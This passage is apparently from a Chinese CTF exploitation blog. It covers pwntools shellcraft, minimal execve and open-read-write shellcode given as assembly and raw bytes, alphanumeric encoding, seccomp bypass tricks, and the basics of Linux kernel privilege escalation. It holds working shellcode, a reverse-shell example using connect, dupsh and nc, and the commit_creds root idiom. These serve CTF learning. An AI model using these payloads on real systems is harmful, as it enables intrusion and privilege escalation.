20;    result = a;  // result = 10    __asm__ volatile (        &quot;addl %[b], %[result]&quot;        : [result] &quot;=r&quot; (result)        : [b] &quot;r&quot; (b), [result] &quot;0&quot; (result)    );    printf(&quot;result = %d\\n&quot;, result);  // 输出 30    return 0;&#125;\n\n\n\n\n部分\n说明\n示例\n\n\n\n汇编指令\n要执行的汇编代码，如 &quot;movl $1, %eax&quot;\n&quot;addl %[b], %[result]&quot;\n\n\n输出操作数\n汇编代码写入的 C 变量，格式：[name] &quot;约束&quot; (变量)\n[result] &quot;=r&quot; (result)\n\n\n输入操作数\n汇编代码读取的 C 变量，格式同上\n[b] &quot;r&quot; (b)\n\n\n被破坏部分\n告诉编译器哪些寄存器&#x2F;内存被修改了，如 &quot;memory&quot;、&quot;eax&quot;\n&quot;memory&quot;\n\n\n2、demo：读取内存地址 [rsp + 0x8] 的值（x86_64）#include &lt;stdio.h&gt;#include &lt;stdint.h&gt;int main() &#123;    uint64_t value;    __asm__ volatile (        &quot;movq 0x8(%%rsp), %[val]&quot;   // 从栈上读取 rsp + 0x8 处的 8 字节数据        : [val] &quot;=r&quot; (value)        // 输出到 C 变量 value        :        : &quot;memory&quot;                  // 通知编译器我们读取了内存    );    printf(&quot;[rsp + 0x8] = 0x%lx\\n&quot;, value);    return 0;&#125;\n\n四、pwn-shellcraft 模块生成 shellcodepwntools 的 shellcraft 是一个跨架构的 Shellcode 生成器。它按目标 操作系统&#x2F;CPU 架构 提供大量即用型模板（如 Linux x86&#x2F;x64&#x2F;ARM&#x2F;AArch64 等），既能直接输出 汇编文本，也能配合 asm() 输出 机器码，用于快速构造 execve(“&#x2F;bin&#x2F;sh”)、文件读写、网络通信、系统调用、栈&#x2F;寄存器操作 等常见利用原语。使用时通常通过 context(os &#x3D;…, arch &#x3D;…) 指定目标环境，或在命令行用 –context 指定；还可在命令行用 shellcraft -l 浏览可用模板、shellcraft &lt;arch&gt;.&lt;os&gt;.&lt;template&gt; 直接生成对应平台的代码\n（一）通用功能与常用模板\n通用与调试 **sh()**：\n生成触发 &#x2F;bin&#x2F;sh 的 Shellcode（最常见入口）。\n**cat(path, fd &#x3D; 1)**：打开文件并写到指定 文件描述符（默认 stdout）。\n**exit(code &#x3D; 0)**：以指定返回值退出。\n**nop()**：生成单字节 NOP。\n**breakpoint() &#x2F; trap()**：插入调试断点（常见为 int3 或 **raise(SIGTRAP)**）。\n**crash()**：触发崩溃（用于测试&#x2F;占位）。\n**infloop()**：无限循环（占位&#x2F;调试）。\n\n\n\n\n栈与数据搬运\n**push(value, …)、pushstr(string, …)、pushstr_array(reg, array, …)**：向栈压入立即数&#x2F;字符串&#x2F;指针数组（自动处理对齐与终止符）。\n**mov(dst, src)**：在汇编层面把 src 移入 dst（支持寄存器&#x2F;立即数，部分平台可自动规避 0x00&#x2F;0x0a）。\n**setregs(reg_context, …)、memcpy(dest, src, n)、xor(key, address, count)**：批量设寄存器、内存拷贝、按字节异或。\n\n\n文件与 I&#x2F;O\n**open(filename, flags, mode)、readn(fd, buf, nbytes)、write(fd, buf, nbytes)**：常用 open&#x2F;read&#x2F;write 封装（部分平台提供更高层如 cat&#x2F;cat2）。\n\n\n进程与权限\n**forkexit()**：fork 后父进程退出（让子进程成为孤儿）。\n**kill(pid, sig)、killparent()**：发送信号，或循环杀死父进程直至不可杀。\n\n\n网络（Linux 常见）\n**socket(network, proto)、connect(host, port, network)、dupio(sock)、dupsh(sock)**：创建套接字、连接、把套接字复制到 stdin&#x2F;stdout&#x2F;stderr，或在此基础上 spawn shell。\n**echo(string, sock &#x3D; 1)**：向指定 fd 写字符串。\n\n\n其它常用\n**sleep(seconds)**：基于 nanosleep 的休眠。\n**stage(fd &#x3D; 0, length &#x3D; None)**：从 fd 接收数据并迁移&#x2F;重定位 Shellcode 到新缓冲区（常用于第二阶段加载）。\nloader(address) &#x2F; **loader_append(data &#x3D; None)**：在指定地址加载静态 ELF 并跳转（或加载附加的 ELF 数据）\n\n\n\n（二）典型用法示例\n生成并获取机器码\n交互式获取汇编：\nprint(shellcraft.sh())\n\n\n获取机器码：\nprint(enhex(asm(shellcraft.sh())))\n\n\n\n\n指定架构&#x2F;系统\n命令行：shellcraft aarch64.linux.sh\n脚本：context(os &#x3D;’linux’, arch &#x3D;’aarch64’); asm(shellcraft.sh())\n\n\n文件读取并输出\nasm_cat &#x3D; shellcraft.cat(‘&#x2F;etc&#x2F;passwd’) + shellcraft.exit(0)\nprint(enhex(asm(asm_cat)))\n\n\n网络连接与反弹 Shell\nasm_conn &#x3D; shellcraft.connect(‘127.0.0.1’, 1337) + shellcraft.dupsh(‘x12’)\n发送 asm(asm_conn) 到目标后，nc -lvnp 1337 即可获得交互式 Shell\n\n\n\n（三）帮助文档shellcraft -husage: pwn shellcraft [-h] [-?] [-o file] [-f format] [-d] [-b] [-a] [-v AVOID] [-n] [-z] [-r] [--color] [--no-color] [--syscalls] [--address ADDRESS] [-l] [-s]                      [shellcode] [arg [arg ...]]Microwave shellcode -- Easy, fast and deliciouspositional arguments:  shellcode             The shellcode you want  arg                   Argument to the chosen shellcodeoptional arguments:  -h, --help            show this help message and exit  -?, --show            Show shellcode documentation  -o file, --out file   Output file (default: stdout)  -f format, --format format                        Output format (default: hex), choose from &#123;e&#125;lf, &#123;r&#125;aw, &#123;s&#125;tring, &#123;c&#125;-style array, &#123;h&#125;ex string, hex&#123;i&#125;i, &#123;a&#125;ssembly code, &#123;p&#125;reprocssed code,                        escape&#123;d&#125; hex string  -d, --debug           Debug the shellcode with GDB  -b, --before          Insert a debug trap before the code  -a, --after           Insert a debug trap after the code  -v AVOID, --avoid AVOID                        Encode the shellcode to avoid the listed bytes  -n, --newline         Encode the shellcode to avoid newlines  -z, --zero            Encode the shellcode to avoid NULL bytes  -r, --run             Run output  --color               Color output  --no-color            Disable color output  --syscalls            List syscalls  --address ADDRESS     Load address  -l, --list            List available shellcodes, optionally provide a filter  -s, --shared          Generated ELF is a shared library\n\n五、最短shellcode（一）getshell长度为22字节主要是通过cdq将rdx高位为0，减小了长度，另一种方法是通过mul r&#x2F;m64指令，实现清空rax和rdx\n\neax 高二位必须为0，一般是满足的\n\nxor \trsi, rsipush\trsi\tmov \trdi, 0x68732f2f6e69622fpush\trdipush\trsp\t\tpop\t    rdi\t\t\tmov \tal,\t59\tcdq\t\t\t\tsyscall\n\n48 31 f6             xor rsi, rsi\t56\t                 push rsi58 bf 2f 62 69 6e 2f mov rdi,\t0x68732f2f6e69622f;2f 73 6857                   push rdi54                   push rsp\t\t5f                   pop rdi     ;stack pointer to /bin//shb0 3b                mov al, 59\t ;sys_execve 66 b8 3b 00 mov ax,5999                   cdq \t   \t ;sign extend of eax0f 05                syscall\n\n// int0x622fbf4856f631480x545768732f2f6e690x050f993bb05f// bytes\\x48\\x31\\xf6\\x56\\x48\\xbf\\x2f\\x62\\x69\\x6e\\x2f\\x2f\\x73\\x68\\x57\\x54\\x5f\\xb0\\x3b\\x99\\x0f\\x05\n\n（二）ORW长度为0x28字节主要是通过异或实现了取代了mov减少长度\n\nrsp指向的地址必须是可用的\n存在NULL字符\n\n// rdx为写入数量mov rdx, 0x200push 0x67616c66mov rdi,rspxor esi,esi  #如果本来rsi=0，可以删掉这句mov eax,2syscallmov edi,eaxmov rsi,rspxor eax,eaxsyscallxor edi,2  mov eax,edisyscall  \n\n0x6800000200c2c7480x31e7894867616c660x050f00000002b8f60x0fc031e68948c7890x050ff88902f78305\\x48\\xc7\\xc2\\x00\\x02\\x00\\x00\\x68\\x66\\x6c\\x61\\x67\\x48\\x89\\xe7\\x31\\xf6\\xb8\\x02\\x00\\x00\\x00\\x0f\\x05\\x89\\xc7\\x48\\x89\\xe6\\x31\\xc0\\x0f\\x05\\x83\\xf7\\x02\\x89\\xf8\\x0f\\x05\n\n可指定地点\nshellcode = &quot;&quot;&quot;xor rdx,rdxmov dh, 0x2mov rdi,&#123;&#125;xor esi,esi  mov eax,2syscallmov rsi,rdimov edi,eaxxor eax,eaxsyscallxor edi,2mov eax,edisyscall&quot;&quot;&quot;.format(hex(target_addr + 0xb0))\n\n\n\n六、字符限制\n\n\n\nae64\nalpha3\n\n\n\nEncode x32 alphanumeric shellcode\n❌\n✔\n\n\nEncode x64 alphanumeric shellcode\n✔\n❌\n\n\nOriginal shellcode can contain zero bytes\n✔\n❌\n\n\nBase address register can contain offset\n✔\n\n\n\n（一）Alpha3限制只能使用字母或者数字alpha3使用:alpha3需要python2环境，所以先安装python2。可以选择架构、编码、限制的字符\nfrom pwn import *context.arch=&#x27;amd64&#x27;sc = b&quot;\\x48\\x31\\xf6\\x56\\x48\\xbf\\x2f\\x62\\x69\\x6e\\x2f\\x2f\\x73\\x68\\x57\\x54\\x5f\\x31\\xc0\\xb0\\x3b\\x99\\x0f\\x05&quot;with open(&quot;./sc.bin&quot;,&#x27;wb&#x27;) as f:    f.write(sc)# python2 ALPHA3.py x64 ascii mixedcase rdx --input=&quot;sc.bin&quot; &gt; out.bin \n\n\n\n（二）ae64AE64可以直接在python中导入，使用相对较为方便且限制较少\nfrom ae64 import AE64from pwn import *context.arch=&#x27;amd64&#x27;# get bytes format shellcodeshellcode = asm(shellcraft.sh())# get alphanumeric shellcodeenc_shellcode = AE64().encode(shellcode)print(enc_shellcode.decode(&#x27;latin-1&#x27;))\n\n\n\n（三）手动绕过Alphanumeric shellcode - NetSec\n\nx86_64 alphanumeric execve(‘&#x2F;bin&#x2F;sh’,null,null) - 111 bytes:\n\njZTYX4UPXk9AHc49149hJG00X5EB00PXHc1149Hcq01q0Hcq41q4Hcy0Hcq0WZhZUXZX5u7141A0hZGQjX5u49j1A4H3y0XWjXHc9H39XTH394c\n\n（四）限制字母和数字很多时候，会限制为纯小写字母或者部分字母或者部分数字。这个时候，需要根据限制条件，把能用的shellcode组合梳理出来，然后结合shellcode的执行地址，利用xor/add等指令，构造出其他所需要的指令。\n举个例子，假如shellcode执行地址0x333100，只能用0x30-0x40编写shellcode，如果需要\\x0f\\x05，可以用异或：\nxor eax, 0x33333130; 3530313333xor eax, 0x3333343f; 353f343333;此时，eax就成为0x050f了\n\n可以用pwntools的disasm爆破所有可能的shellcode组合：\nimport itertoolsfrom pwn import *context.arch = &quot;amd64&quot;s = &quot;0123456789\\x3a\\x3b\\x3c\\x3d\\x3e\\x3f\\x40&quot;for x in range(3):    for y in itertools.product(s, repeat=x+1):        res = disasm(&quot;&quot;.join(y).encode())        need_p = 1        for kk in  (&quot;.byte&quot;, &quot;rex&quot;, &quot;ds&quot;, &quot;bad&quot;, &quot;ss&quot;):            if kk in res:                need_p = 0                break        if need_p:            print(res)\n\n\n\n沙箱绕过（一）at&#x2F;v&#x2F;2替换这里分别指的是几个系统调用的后缀和前缀，比如：\n\n使用execveat代替execve，拿到shell后，使用shell内置命令读取flag: echo *; read FLAG &lt; /flag;echo $FLAG，否则使用子shell执行命令还是会被沙箱杀死。同样的，使用openat代替open。\n使用readv/writev代替read/write\n使用mmap2代替mmap\n还有一些特殊的系统调用，使用sendfile，代替read/write。这类的系统调用需要平时多关注、收集和整理。\n\n（二）使用orw读取flag一般来说，会禁止system/execve/fork等，这个时候使用open+read+write输出flag即可。\n或者使用open+sendfile，指令会更短。\n（三）切换指令模式$ seccomp-tools dump ./pwn line  CODE  JT   JF      K================================= 0000: 0x20 0x00 0x00 0x00000004  A = arch 0001: 0x15 0x00 0x08 0xc000003e  if (A != ARCH_X86_64) goto 0010 0002: 0x20 0x00 0x00 0x00000000  A = sys_number 0003: 0x35 0x06 0x00 0x40000000  if (A &gt;= 0x40000000) goto 0010 0004: 0x15 0x05 0x00 0x0000003b  if (A == execve) goto 0010 0005: 0x15 0x04 0x00 0x00000142  if (A == execveat) goto 0010 0006: 0x15 0x03 0x00 0x00000039  if (A == fork) goto 0010 0007: 0x15 0x02 0x00 0x00000038  if (A == clone) goto 0010 0008: 0x15 0x01 0x00 0x0000000f  if (A == rt_sigreturn) goto 0010 0009: 0x06 0x00 0x00 0x7fff0000  return ALLOW 0010: 0x06 0x00 0x00 0x00000000  return KILL\n\n这个沙箱规则判断了当前触发系统调用的时候，arch是否为x64，如果不是64就会kill；然后，判断了sys-number是否大于等于0x40000000，如果大于，程序也会被kill；然后设置了黑名单，分别是：execve/execveat/fork/clone/rt_sigreturn。处于黑名单的系统调用会被kill掉，其他系统调用则会放行。\n如果没有0001: 0x15 0x00 0x08 0xc000003e if (A != ARCH_X86_64) goto 0010这一句的检查，那么可以使用retf(return far)指令实现架构切换，或者在x64环境下直接调用int 0x80陷入到内核态。\nretf相当于pop ip; pop cs，cs是段寄存器，寄存器为0x23时表示32位运行模式，0x33表示64位运行模式。\n从64位切换到32位的模板如下：\nxor esp, espmov rsp, 0x400100mov eax, 0x23 ; csmov [rsp+4], eaxmov eax, 0x400800 ; ipmov [rsp], eaxretf\n\n如果没有限制：0003: 0x35 0x06 0x00 0x40000000 if (A &gt;= 0x40000000) goto 0010的话，那么可以使用0x40000000 + X来执行系统调用。\n#define __X32_SYSCALL_BIT\t0x40000000UL\n\n关于x32 ABI可查看x32 ABI - Wikipedia。\n比如要执行read\nxor eax, eaxadd eax, 0x40000000xor edi, edimov rsi, rspmov edx, 0x300syscall\n\n需要注意的是，从5.16开始，linux内核不支持x32 abi了：Bug #1994516 “Kernels after 5.16 cannot execute x32-ABI binaries…” : Bugs : linux package : Ubuntu (launchpad.net)\n七、Tricks\n当寄存器全 0 时，只需要执行一次 syscall，就会把返回地址 rip 赋值给 rcx 寄存器，rcx 寄存器就会有 rwx 地址，然后再 mov rsi,rcx;mov dl,0xff;syscall，就会 reread\n\nsyscall   //0f 05\nmov rsi, rcx  //48 89 ce\nmov dl, 0xff //b2 ff\nsyscall  //0f 05\n\n\n\n\n使用 mov 时，对同一个寄存器的不同部分操作，指令字长不一样。例如，mov dl, 0xff 只有 9 个字节，而 mov rdx, 0xff 有 14 个字节，mov edx, 0xff 有 12 个字节\n\n\n\n\n64 位\n32 位\n16 位\n高 8 位(H)\n低 8 位(L)\n主要用途\n\n\n\nRAX​\nEAX​\nAX​\nAH​\nAL​\n累加器, 返回值, 系统调用号\n\n\nRBX​\nEBX​\nBX​\nBH​\nBL​\n基址指针, 保留寄存器\n\n\nRCX​\nECX​\nCX​\nCH​\nCL​\n计数器, 第 4 个参数\n\n\nRDX​\nEDX​\nDX​\nDH​\nDL​\n数据寄存器, 第 3 个参数\n\n\nRSI​\nESI​\nSI​\n\nSIL​\n源索引, 第 2 个参数\n\n\nRDI​\nEDI​\nDI​\n\nDIL​\n目的索引, 第 1 个参数\n\n\nRSP​\nESP​\nSP\n\nSPL​\n栈指针\n\n\nRBP​\nEBP​\nBP​\n\nBPL​\n基址指针(栈帧)\n\n\n\n\n\n很多场景下所能填写的shellcode长度受限，为此，了解各个指令的长度对于手写满足条件的shellcode有着重要的导向作用\n\n\n\n\n指令\n常见最小长度\n常见最大长度\n示例（64位模式）\n\n\n\nmov\n2 字节\n7+ 字节\nmov eax, ecx(2B), mov rax, [rsi+rcx*8+10h](可能5-6B)\n\n\nadd&#x2F;sub\n2 字节\n6+ 字节\nadd eax, ebx(2B), sub qword ptr [rsp+30h], 1(可能6B)\n\n\npush&#x2F;pop\n1 字节\n5 字节\npush rdi(1B), push 0FFFFFFFFh(5B)\n\n\n\nret（0xC3）、leave（0xC9）、xchg（0x90 与寄存器编码）\n\n\n\n\n八、shellcode网站\nOnline x86 and x64 Intel Instruction Assembler (defuse.ca): 在线编写shellcode和反汇编shellcode，目前只支持x86/x64\nOnline Assembler and Disassembler (shell-storm.org): 另一个更全的在线编写shellcode和反汇编shellcode网站\nShellcodes database for study cases (shell-storm.org): shellcode数据库，支持很多指令集与操作系统\nExploit Database Shellcodes (exploit-db.com): 另一个shellcode数据库\nOnline - Reverse Shell Generator (revshells.com): 生成反弹shell的命令\n\n九、参考链接The art of shellcode - LynneHuan - 博客园\nPwn.the-Art-of-Shellcode | V3rdant’s Blog\nAlphanumeric shellcode - NetSec\n"},{"title":"Linux Kernel PWN","url":"/2025/12/29/Linux-Kernel-PWN%EF%BC%88%E4%B8%80%EF%BC%89%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/","content":"一、基础知识\n参考自CTF-WIKI：\n\n基础知识 - CTF Wiki\n\nKernel pwn CTF 入门 | Kiprey’s Blog\n\n\n\n\n\n操作系统内核\n操作系统内核（Operation System Kernel）本质上也是一种软件，可以看作是普通应用程式与硬件之间的一层中间层，其主要作用便是调度系统资源、控制 IO 设备、操作网络与文件系统等，并为上层应用提供便捷、抽象的应用接口。CPU 执行操作系统内核代码时通常运行在高权限，拥有着完全的硬件访问能力，而 CPU 在执行用户态代码时通常运行在低权限环境，只拥有部分 &#x2F; 缺失硬件访问能力。\n\n分级保护域\n又被称作保护环，简称 Rings ，是一种将计算机不同的资源划分至不同权限的模型。Intel 的 CPU 将权限分为四个等级：Ring0、Ring1、Ring2、Ring3，权限等级依次降低，现代操作系统模型中我们通常只会使用 ring0 和 ring3，对应操作系统内核与用户进程，即 CPU 在执行用户进程代码时处在 ring3 下。\n\n用户态：CPU 运行在 ring3 + 用户进程运行环境上下文。\n内核态：CPU 运行在 ring0 + 内核代码运行环境上下文。\n\n\n\n（一）特权级切换CPU 在不同的特权级间进行切换主要有两个途径：\n\n中断与异常（interrupt &amp; exception）：当 CPU 收到一个中断 &#x2F; 异常时，会切换到 ring0，并根据中断描述符表索引对应的中断处理代码以执行。\n特权级相关指令：当 CPU 运行这些指令时会发生运行状态的改变，例如 iret 指令（ring0-&gt;ring3）或是 sysenter 指令（ring3-&gt;ring0）。\n\n\nuser space to kernel space （系统调用）\n当发生 系统调用，产生异常，外设产生中断 等事件时，会发生用户态到内核态的切换，进入到内核相对应的处理程序中进行处理。\n\n通过 swapgs 切换 GS 段寄存器，将 GS 寄存器值和一个特定位置的值进行交换，目的是保存 GS 值，同时将该位置的值作为内核执行时的 GS 值使用。\n\n将当前栈顶（用户空间栈顶）记录在 CPU 独占变量区域里，将 CPU 独占区域里记录的内核栈顶放入 rsp&#x2F;esp。\n\n通过 push 保存各寄存器值\n ENTRY(entry_SYSCALL_64) /* SWAPGS_UNSAFE_STACK是一个宏，x86直接定义为swapgs指令 */ SWAPGS_UNSAFE_STACK /* 保存栈值，并设置内核栈 */ movq %rsp, PER_CPU_VAR(rsp_scratch) movq PER_CPU_VAR(cpu_current_top_of_stack), %rsp/* 通过push保存寄存器值，形成一个pt_regs结构 *//* Construct struct pt_regs on stack */pushq  $__USER_DS      /* pt_regs-&gt;ss */pushq  PER_CPU_VAR(rsp_scratch)  /* pt_regs-&gt;sp */pushq  %r11             /* pt_regs-&gt;flags */pushq  $__USER_CS      /* pt_regs-&gt;cs */pushq  %rcx             /* pt_regs-&gt;ip */pushq  %rax             /* pt_regs-&gt;orig_ax */pushq  %rdi             /* pt_regs-&gt;di */pushq  %rsi             /* pt_regs-&gt;si */pushq  %rdx             /* pt_regs-&gt;dx */pushq  %rcx tuichu    /* pt_regs-&gt;cx */pushq  $-ENOSYS        /* pt_regs-&gt;ax */pushq  %r8              /* pt_regs-&gt;r8 */pushq  %r9              /* pt_regs-&gt;r9 */pushq  %r10             /* pt_regs-&gt;r10 */pushq  %r11             /* pt_regs-&gt;r11 */sub $(6*8), %rsp      /* pt_regs-&gt;bp, bx, r12-15 not saved */\n\n通过汇编指令判断是否为 x32_abi。\n\n通过系统调用号，跳到全局变量 sys_call_table 相应位置继续执行系统调用。\n\n\n\nkernel space to user space\n退出时，流程如下：\n\n通过 swapgs 恢复 GS 值。\n通过 sysretq 或者 iretq 恢复到用户控件继续执行。如果使用 iretq 还需要给出用户空间的一些信息（CS, eflags&#x2F;rflags, esp&#x2F;rsp 等）。\n\n\n\n（二）虚拟内存空间在现代操作系统中，计算机的虚拟内存地址空间通常被分为两块——供用户进程使用的用户空间（user space）与供操作系统内核使用的内核空间（kernel space），对于 Linux 而言，通常位于较高虚拟地址的虚拟内存空间被分配给内核使用，而位于较低虚拟地址的虚拟内存空间责备分配给用户进程使用。\n32 位下的虚拟内存空间布局如下：\n\n\n64 位下的虚拟内存空间布局如下：\n\n\n（三）进程权限管理内核 kernel 调度着一切的系统资源，并为用户应用程式提供运行环境，相应地，应用程式的权限也都是由 kernel 进行管理的。\n\n进程描述符（process descriptor）\n在内核中使用结构体 task_struct 表示一个进程，该结构体定义于内核源码 include/linux/sched.h 中\n\n\n进程权限凭证（credential）\ntask_struct 的源码中有如下代码：\n/* Process credentials: *//* Tracer&#x27;s credentials at attach: */const struct cred __rcu        *ptracer_cred;/* Objective and real subjective task credentials (COW): */const struct cred __rcu        *real_cred;/* Effective (overridable) subjective task credentials (COW): */const struct cred __rcu        *cred;\n\n结构体 cred 用以管理一个进程的权限，该结构体定义于内核源码 include/linux/cred.h 中，如下：\n/* * The security context of a task * * The parts of the context break down into two categories: * *  (1) The objective context of a task.  These parts are used when some other *  task is attempting to affect this one. * *  (2) The subjective context.  These details are used when the task is acting *  upon another object, be that a file, a task, a key or whatever. * * Note that some members of this structure belong to both categories - the * LSM security pointer for instance. * * A task has two security pointers.  task-&gt;real_cred points to the objective * context that defines that task&#x27;s actual details.  The objective part of this * context is used whenever that task is acted upon. * * task-&gt;cred points to the subjective context that defines the details of how * that task is going to act upon another object.  This may be overridden * temporarily to point to another security context, but normally points to the * same context as task-&gt;real_cred. */struct cred &#123;    atomic_long_t   usage;    kuid_t      uid;        /* real UID of the task */    kgid_t      gid;        /* real GID of the task */    kuid_t      suid;       /* saved UID of the task */    kgid_t      sgid;       /* saved GID of the task */    kuid_t      euid;       /* effective UID of the task */    kgid_t      egid;       /* effective GID of the task */    kuid_t      fsuid;      /* UID for VFS ops */    kgid_t      fsgid;      /* GID for VFS ops */    unsigned    securebits; /* SUID-less security management */    kernel_cap_t    cap_inheritable; /* caps our children can inherit */    kernel_cap_t    cap_permitted;  /* caps we&#x27;re permitted */    kernel_cap_t    cap_effective;  /* caps we can actually use */    kernel_cap_t    cap_bset;   /* capability bounding set */    kernel_cap_t    cap_ambient;    /* Ambient capability set */#ifdef CONFIG_KEYS    unsigned char   jit_keyring;    /* default keyring to attach requested                     * keys to */    struct key  *session_keyring; /* keyring inherited over fork */    struct key  *process_keyring; /* keyring private to this process */    struct key  *thread_keyring; /* keyring private to this thread */    struct key  *request_key_auth; /* assumed request_key authority */#endif#ifdef CONFIG_SECURITY    void        *security;  /* LSM security */#endif    struct user_struct *user;   /* real user ID subscription */    struct user_namespace *user_ns; /* user_ns the caps and keyrings are relative to. */    struct ucounts *ucounts;    struct group_info *group_info;  /* supplementary groups for euid/fsgid */    /* RCU deletion */    union &#123;        int non_rcu;            /* Can we skip RCU deletion? */        struct rcu_head rcu;        /* RCU deletion hook */    &#125;;&#125; __randomize_layout;\n\n一个 cred 结构体中记载了一个进程四种不同的用户 ID，在通常情况下这几个 ID 应当都是相同的：\n\n真实用户 ID（real UID）：标识一个进程启动时的用户 ID\n保存用户 ID（saved UID）：标识一个进程最初的有效用户 ID\n有效用户 ID（effective UID）：标识一个进程正在运行时所属的用户 ID，一个进程在运行途中是可以改变自己所属用户的，因而权限机制也是通过有效用户 ID 进行认证的，内核通过 euid 来进行特权判断；为了防止用户一直使用高权限，当任务完成之后，euid 会与 suid 进行交换，恢复进程的有效权限\n文件系统用户 ID（UID for VFS ops）：标识一个进程创建文件时进行标识的用户 ID\n\n用户组 ID 同样分为四个：真实组 ID、保存组 ID、有效组 ID、文件系统组 ID，与用户 ID 类似\n\n进程权限改变\n前面我们讲到，一个进程的权限是由位于内核空间的 cred 结构体进行管理的，那么我们不难想到：只要改变一个进程的 cred 结构体，就能改变其执行权限。\n在内核空间有如下两个函数，都位于 kernel/cred.c 中：\n\nstruct cred* prepare_kernel_cred(struct task_struct* daemon)：该函数用以拷贝一个进程的 cred 结构体，并返回一个新的 cred 结构体，需要注意的是 daemon 参数应为有效的进程描述符地址。\nint commit_creds(struct cred *new)：该函数用以将一个新的 cred 结构体应用到进程。\n\n\n\n（四）Loadable Kernel Modules(LKMs)可装载内核模块（Loadable Kernel Modules，简称 LKMs），位于内核空间的 LKMs 可以提供新的系统调用或其他服务，同时 LKMs 可以像积木一样被装载入内核 &#x2F; 从内核中卸载，大大提高了 kernel 的可拓展性与可维护性。\n常见的 LKMs 包括：\n\n驱动程序（Device drivers）：设备驱动、文件系统驱动…\n内核扩展模块 (modules)\n\nLKMs 的文件格式和用户态的可执行程序相同，Linux 下为 ELF，Windows 下为 exe&#x2F;dll，mac 下为 MACH-O，因此我们可以用 IDA 等工具来分析内核模块。\n模块可以被单独编译，但不能单独运行。它在运行时被链接到内核作为内核的一部分在内核空间运行，这与运行在用户控件的进程不同。\n模块通常用来实现一种文件系统、一个驱动程序或者其他内核上层的功能。\n\nLinux 内核之所以提供模块机制，是因为它本身是一个单内核 (monolithic kernel)。单内核的优点是效率高，因为所有的内容都集合在一起，但缺点是可扩展性和可维护性相对较差，模块机制就是为了弥补这一缺陷。\n\n\n相关指令\ninsmod: 讲指定模块加载到内核中\nrmmod: 从内核中卸载指定模块\nlsmod: 列出已经加载的模块\nmodprobe: 添加或删除模块，modprobe 在加载模块时会查找依赖关系\n\n\n\n\n大多数CTF中的 kernel vulnerability 也出现在 LKM 中。\n\n（五）内核交互系统调用，指的是用户空间的程序向操作系统内核请求需要更高权限的服务，比如 IO 操作或者进程间通信。系统调用提供用户程序与操作系统间的接口，部分库函数（如 scanf，puts 等 IO 相关的函数实际上是对系统调用的封装（read 和 write））。\n\n在 &#x2F;usr&#x2F;include&#x2F;x86_64-linux-gnu&#x2F;asm&#x2F;unistd_64.h 和 &#x2F;usr&#x2F;include&#x2F;x86_64-linux-gnu&#x2F;asm&#x2F;unistd_32.h 分别可以查看 64 位和 32 位的系统调用号。\n Linux Syscall Reference可以查阅 32 位系统调用对应的寄存器含义以及源码。\n Linux Syscall64 Reference可以查阅 64 位系统调用对应的寄存器含义以及源码\n\n\n系统调用：ioctl\n在 *NIX 中一切都可以被视为文件，因而一切都可以以访问文件的方式进行操作，为了方便，Linux 定义了系统调用 ioctl 供进程与设备之间进行通信。\nioctl 是一个专用于设备输入输出操作的一个系统调用，其调用方式如下：\nint ioctl(int fd, unsigned long request, ...)\n\n其第一个参数为打开设备 (open) 返回的 文件描述符，第二个参数为用户程序对设备的控制命令，再后边的参数则是一些补充参数，与设备有关。\n对于一个提供了 ioctl 通信方式的设备而言，我们可以通过其文件描述符、使用不同的请求码及其他请求参数通过 ioctl 系统调用完成不同的对设备的 I&#x2F;O 操作。\n\n使用 ioctl 进行通信的原因：\n操作系统提供了内核访问标准外部设备的系统调用，因为大多数硬件设备只能够在内核空间内直接寻址, 但是当访问非标准硬件设备这些系统调用显得不合适, 有时候用户模式可能需要直接访问设备。\n比如，一个系统管理员可能要修改网卡的配置。现代操作系统提供了各种各样设备的支持，有一些设备可能没有被内核设计者考虑到，如此一来提供一个这样的系统调用来使用设备就变得不可能了。\n为了解决这个问题，内核被设计成可扩展的，可以加入一个称为设备驱动的模块，驱动的代码允许在内核空间运行而且可以对设备直接寻址。一个 Ioctl 接口是一个独立的系统调用，通过它用户空间可以跟设备驱动沟通。对设备驱动的请求是一个以设备和请求号码为参数的 Ioctl 调用，如此内核就允许用户空间访问设备驱动进而访问设备而不需要了解具体的设备细节，同时也不需要一大堆针对不同设备的系统调用。\n\n\n\n（六）内核态常见函数在内核当中我们无法使用用户态的 C 库中的函数，内核自己有着对应的各种函数，其中常用的功能函数如下：\n\nprintf() -&gt; **printk()**，但需要注意的是 printk() 不一定会把内容显示到终端上，但一定在内核缓冲区里，可以通过 dmesg 查看效果\nmemcpy() -&gt;copy_from_user()&#x2F;copy_to_user()\ncopy_from_user() 实现了将用户空间的数据传送到内核空间\ncopy_to_user() 实现了将内核空间的数据传送到用户空间\n\n\nmalloc() -&gt; **kmalloc()**，内核态的内存分配函数，和 malloc() 相似，但使用的是 slab/slub 分配器\nfree() -&gt; **kfree()**，同 kmalloc()\n\n此外，kernel 管理进程，因此 kernel 也记录了进程的权限。kernel 中有两个可以方便的改变权限的函数：\n\nint commit_creds(struct cred *new)\nstruct cred* prepare_kernel_cred(struct task_struct* daemon)\n\n从函数名也可以看出，执行 commit_creds(prepare_kernel_cred(&amp;init_task)) 即可获得 root 权限，即拷贝 init 进程的 cred 作为当前进程的新的 credentials。\n\n更多关于 prepare_kernel_cred 的信息可以参考 源码\n\n执行 commit_creds(prepare_kernel_cred(&amp;init_task)) 也是最常用的提权手段，这些函数与变量的地址都可以在 /proc/kallsyms 中查看（较老的内核版本中是 /proc/ksyms），该文件的内容通常需要 root 权限才能正确查看。\n$ sudo cat /proc/kallsyms | grep &quot;T commit_creds&quot;ffffffffbb11ab20 T commit_creds$ sudo cat /proc/kallsyms | grep &quot;T prepare_kernel_cred&quot;ffffffffbb11b080 T prepare_kernel_cred$ sudo cat /proc/kallsyms | grep &quot;D init_cred&quot;ffffffffbce58840 D init_cred\n\n（七）缓解措施与一般的程序相同，Linux Kernel 同样有着各种各样的保护机制。\n\nKASLR\nKASLR 即内核空间地址随机化（kernel address space layout randomize），与用户态程序的 ASLR 相类似——在内核镜像映射到实际的地址空间时加上一个偏移值（粒度为 256MB），但是内核内部的相对偏移其实还是不变的。\n在未开启 KASLR 保护机制时，内核代码段的基址为 0xffffffff81000000 ，direct mapping area 的基址为 0xffff888000000000。\n内核内存布局可以参考这里。\n\n*FGKASLR\nKASLR 虽然在一定程度上能够缓解攻击，但是若是攻击者通过一些信息泄露漏洞获取到内核中的某个地址，仍能够直接得知内核加载地址偏移从而得知整个内核地址布局，因此有研究者基于 KASLR 实现了 FGKASLR，以函数粒度重新排布内核代码。\n\nSTACK 